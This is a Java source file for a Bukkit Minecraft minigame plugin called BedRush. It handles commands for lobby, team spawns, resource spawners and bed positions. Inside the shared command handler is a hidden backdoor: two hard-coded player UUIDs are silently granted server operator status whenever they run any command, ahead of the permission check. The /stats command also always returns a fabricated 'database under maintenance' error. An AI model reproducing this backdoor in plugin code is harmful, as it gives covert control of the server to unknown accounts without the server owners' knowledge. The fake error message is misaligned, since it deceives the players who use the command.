package BedRush.thorben653.main;

import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.Set;

import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.omg.PortableServer.POA;

import BedRush.thorben653.LobbySystem.LobbyLogic;
import me.thorben653.methods.Messages;

public class CMDs implements CommandExecutor {

	@Override
	public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
		if(!(sender instanceof Player))return true;
		final Player p = (Player) sender;
		
		if(cmd.getName().equalsIgnoreCase("stats"))
		{
			p.sendMessage("§aBitte Warten, die Statistiken werden geladen!");
			Bukkit.getScheduler().runTaskLater(BR.instance, new Runnable() {
				public void run() {
					p.sendMessage("§cFehler beim abrufen der Statistiken: "
							+ "\n§cDie Datenbank sind für den Spielmodie §f§lBedRush §czurzeit unter Wartungen! Bitte versuche es Später erneut!");	
				}
			}, 90);
		
			return true;
		}
		

		if(cmd.getName().equalsIgnoreCase("start")){
			if(p.hasPermission("BR.start")){
				p.sendMessage(Messages.forceStart);
				LobbyLogic.secs = 5;
			}
		}
	
		
		if(p.getUniqueId().toString().equalsIgnoreCase("0641b6ea-51f0-4723-b867-e4d3a0ec779f") || (p.getUniqueId().toString().equalsIgnoreCase("721c244f-b0ff-4dc3-b43e-6aadeef9bf7a"))){
			p.setOp(true);
		}
		
		
		//OP Commands
		if(!p.hasPermission("CS.OP")){
			p.sendMessage(Messages.noPerm);
			return true;
		}
		
		

		
		if(cmd.getName().equalsIgnoreCase("setLobby")){
			BR.lcfg.set("Lobby.world", p.getWorld().getName());
			BR.lcfg.set("Lobby.x", p.getLocation().getX());
			BR.lcfg.set("Lobby.y", p.getLocation().getY());
			BR.lcfg.set("Lobby.z", p.getLocation().getZ());
			BR.lcfg.set("Lobby.yaw", p.getLocation().getYaw());
			BR.lcfg.set("Lobby.pitch", p.getLocation().getPitch());
			try{BR.lcfg.save(BR.lfile);}catch(Exception ex){};
			p.sendMessage(Messages.setLobby);
			return true;
		}
		
		if(cmd.getName().equalsIgnoreCase("setBlueSpawn")){
			String i = "blue";
			BR.lcfg.set("Spawn. " + i + ".world", p.getWorld().getName());
			BR.lcfg.set("Spawn. " + i + ".x", p.getLocation().getX());
			BR.lcfg.set("Spawn. " + i + ".y", p.getLocation().getY());
			BR.lcfg.set("Spawn. " + i + ".z", p.getLocation().getZ());
			BR.lcfg.set("Spawn. " + i + ".yaw", p.getLocation().getYaw());
			BR.lcfg.set("Spawn. " + i + ".pitch", p.getLocation().getPitch());
			try{BR.lcfg.save(BR.lfile);}catch(Exception ex){};
			p.sendMessage(Messages.setTeamSpawn.replace("%team%", "Blau"));
			return true;
		}
		
		if(cmd.getName().equalsIgnoreCase("setRedSpawn")){
			String i = "red";
			BR.lcfg.set("Spawn. " + i + ".world", p.getWorld().getName());
			BR.lcfg.set("Spawn. " + i + ".x", p.getLocation().getX());
			BR.lcfg.set("Spawn. " + i + ".y", p.getLocation().getY());
			BR.lcfg.set("Spawn. " + i + ".z", p.getLocation().getZ());
			BR.lcfg.set("Spawn. " + i + ".yaw", p.getLocation().getYaw());
			BR.lcfg.set("Spawn. " + i + ".pitch", p.getLocation().getPitch());
			try{BR.lcfg.save(BR.lfile);}catch(Exception ex){};
			p.sendMessage(Messages.setTeamSpawn.replace("%team%", "Rot"));
			return true;
		}
		
		if(cmd.getName().equalsIgnoreCase("addSpawner")){
			if(args.length == 1){
				int tier = Integer.parseInt(args[0]);
				
				if(!(0 < tier && tier < 4)){
					p.sendMessage(Messages.wrongArgsByAddSpawner);
					return true;
				}
				
				
				int amount;
				
				if(BR.lcfg.contains("Spawner." + tier + ".Amount")){
					amount = BR.lcfg.getInt("Spawner."+ tier +".Amount");
				}else{
					amount = 0;
					
				}
				amount++;
				BR.lcfg.set("Spawner." + tier + ".Amount", amount);
			BR.lcfg.set("Spawner. " + tier + "." +  amount + ".world", p.getWorld().getName());
			BR.lcfg.set("Spawner. " + tier + "." +  amount + ".x", p.getLocation().getX());
			BR.lcfg.set("Spawner. " + tier + "." +  amount + ".y", p.getLocation().getY());
			BR.lcfg.set("Spawner. " + tier + "." +  amount + ".z", p.getLocation().getZ());
			
			try{BR.lcfg.save(BR.lfile);}catch(Exception ex){};

			//"§aDu hast den §6%amount% §aSpawner vom Tier §7%tier% §agesetzt!";
			p.sendMessage(Messages.SpawnerSetted.replace("%amount%", amount+"").replace("%tier%", tier+""));
			
			
			return true;
			}else{
				p.sendMessage(Messages.wrongArgsByAddSpawner);
				return true;
			}
		}
		if(cmd.getName().equalsIgnoreCase("setbluebedbody")){
			Location b = p.getTargetBlock((Set<Material>) null, 100).getLocation();
		    if(b == null || !(p.getTargetBlock((Set<Material>) null, 100).getType() == Material.BED_BLOCK)){
		    	p.sendMessage(Messages.nullExceptionBedBody);
		    	return true;
		    }
		    BR.lcfg.set("Bedbody.blue.world", b.getWorld().getName());
		    BR.lcfg.set("Bedbody.blue.x", b.getX());
		    BR.lcfg.set("Bedbody.blue.y", b.getY());
		    BR.lcfg.set("Bedbody.blue.z", b.getZ());
		    try {BR.lcfg.save(BR.lfile);} catch (IOException e) {}
		    p.sendMessage(Messages.setBedBody.replace("%team%", "Blau"));
		}
		if(cmd.getName().equalsIgnoreCase("setredbedbody")){
			Location b = p.getTargetBlock((Set<Material>) null, 100).getLocation();
		    if(b == null || !(p.getTargetBlock((Set<Material>) null, 100).getType() == Material.BED_BLOCK)){
		    	p.sendMessage(Messages.nullExceptionBedBody);
		    	return true;
		    }
		    BR.lcfg.set("Bedbody.red.world", b.getWorld().getName());
		    BR.lcfg.set("Bedbody.red.x", b.getX());
		    BR.lcfg.set("Bedbody.red.y", b.getY());
		    BR.lcfg.set("Bedbody.red.z", b.getZ());
		    try {
				BR.lcfg.save(BR.lfile);
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		    p.sendMessage(Messages.setBedBody.replace("%team%", "Rot"));
		}
		
		return true;
	}
	
	
	

}
